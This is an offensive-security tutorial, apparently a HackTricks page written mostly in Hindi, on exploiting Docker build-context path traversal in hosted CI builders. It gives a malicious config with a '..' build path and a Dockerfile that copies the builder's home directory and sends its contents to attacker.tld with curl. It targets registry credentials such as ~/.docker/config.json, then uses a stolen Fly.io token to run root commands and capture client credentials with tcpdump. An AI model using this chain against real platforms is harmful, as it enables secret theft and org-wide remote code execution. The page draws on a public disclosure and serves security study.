# Hosted Builders में Docker Build Context का दुरुपयोग (Path Traversal, Exfil, and Cloud Pivot)

{{#include ../banners/hacktricks-training.md}}

## TL;DR

यदि कोई CI/CD प्लेटफ़ॉर्म या hosted builder contributors को Docker build context path और Dockerfile path निर्दिष्ट करने देता है, तो अक्सर आप context को parent directory (जैसे "..") पर सेट कर सकते हैं और host फ़ाइलों को build context का हिस्सा बना सकते हैं। फिर, attacker-controlled Dockerfile COPY कर सकता है और builder user के home में पाए जाने वाले secrets को exfiltrate कर सकता है (उदाहरण के लिए, ~/.docker/config.json)। चोरी किए गए registry tokens provider के control-plane APIs के खिलाफ भी काम कर सकते हैं, जिससे org-wide RCE सक्षम हो सकता है।

## Attack surface

Many hosted builder/registry services do roughly this when building user-submitted images:
- Read a repo-level config that includes:
- build context path (sent to the Docker daemon)
- Dockerfile path relative to that context
- Copy the indicated build context directory and the Dockerfile to the Docker daemon
- Build the image and run it as a hosted service

यदि प्लेटफ़ॉर्म build context को canonicalize और restrict नहीं करता है, तो उपयोगकर्ता इसे repository के बाहर किसी स्थान पर सेट कर सकता है (path traversal), जिससे build user द्वारा पढ़ी जा सकने वाली arbitrary host फ़ाइलें build context का हिस्सा बन जाएँगी और Dockerfile में COPY के लिए उपलब्ध हो जाएँगी।

आम तौर पर देखे जाने वाले व्यावहारिक प्रतिबंध:
- The Dockerfile must reside within the chosen context path and its path must be known ahead of time.
- The build user must have read access to files included in the context; special device files can break the copy.

## PoC: Path traversal via Docker build context

Example malicious server config declaring a Dockerfile within the parent directory context:
```yaml
runtime: "container"
build:
dockerfile: "test/Dockerfile"   # Must reside inside the final context
dockerBuildPath: ".."           # Path traversal to builder user $HOME
startCommand:
type: "http"
configSchema:
type: "object"
properties:
apiKey:
type: "string"
required: ["apiKey"]
exampleConfig:
apiKey: "sk-example123"
```
नोट्स:
- ".." का उपयोग अक्सर builder उपयोगकर्ता के होम (उदा., /home/builder) तक पहुँचता है, जिसमें आमतौर पर संवेदनशील फाइलें होती हैं।
- अपनी Dockerfile को repo के डायरेक्टरी नाम के अंतर्गत रखें (उदा., repo "test" → test/Dockerfile) ताकि यह विस्तारित parent context के भीतर रहे।

## PoC: host context को ingest और exfiltrate करने के लिए Dockerfile
```dockerfile
FROM alpine
RUN apk add --no-cache curl
RUN mkdir /data
COPY . /data                      # Copies entire build context (now builder’s $HOME)
RUN curl -si https://attacker.tld/?d=$(find /data | base64 -w 0)
```
आम तौर पर $HOME से प्राप्त लक्ष्य:
- ~/.docker/config.json (registry auths/tokens)
- अन्य cloud/CLI caches और configs (उदा., ~/.fly, ~/.kube, ~/.aws, ~/.config/*)

टिप: भले ही repository में .dockerignore मौजूद हो, कमजोर platform-side context selection तय करता है कि क्या चीज़ें daemon को भेजी जाएँगी। अगर platform चुनी हुई path को आपके repo’s .dockerignore का मूल्यांकन करने से पहले daemon पर कॉपी कर देता है, तो host फ़ाइलें फिर भी उजागर हो सकती हैं।

## Cloud pivot with overprivileged tokens (example: Fly.io Machines API)

Some platforms issue a single bearer token usable for both the container registry and the control-plane API. If you exfiltrate a registry token, try it against the provider API.

Example API calls against Fly.io Machines API using the stolen token from ~/.docker/config.json:

एक org में apps को सूचीबद्ध करें:
```bash
curl -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps?org_slug=smithery"
```
किसी भी ऐप की किसी भी मशीन के अंदर root के रूप में कोई कमांड चलाएँ:
```bash
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"","command":["id"],"container":"","stdin":"","timeout":5}'
```
परिणाम: org-wide remote code execution उन सभी hosted apps में जहाँ token के पास पर्याप्त अधिकार हों।

## Compromised hosted services से Secret चोरी

hosted servers पर exec/RCE होने पर, आप client-supplied secrets (API keys, tokens) को एकत्र कर सकते हैं या prompt-injection attacks अंजाम दे सकते हैं। उदाहरण: tcpdump इंस्टॉल करके port 8080 पर HTTP ट्रैफ़िक कैप्चर करें ताकि inbound credentials निकाले जा सकें।
```bash
# Install tcpdump inside the machine
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"apk add tcpdump","command":[],"container":"","stdin":"","timeout":5}'

# Capture traffic
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"tcpdump -i eth0 -w /tmp/log tcp port 8080","command":[],"container":"","stdin":"","timeout":5}'
```
Captured requests अक्सर headers, bodies, या query params में client credentials होते हैं।

## संदर्भ

- [Breaking MCP Server Hosting: Build-Context Path Traversal to Org-wide RCE and Secret Theft](https://blog.gitguardian.com/breaking-mcp-server-hosting/)
- [Fly.io Machines API](https://fly.io/docs/machines/api/)

{{#include ../banners/hacktricks-training.md}}
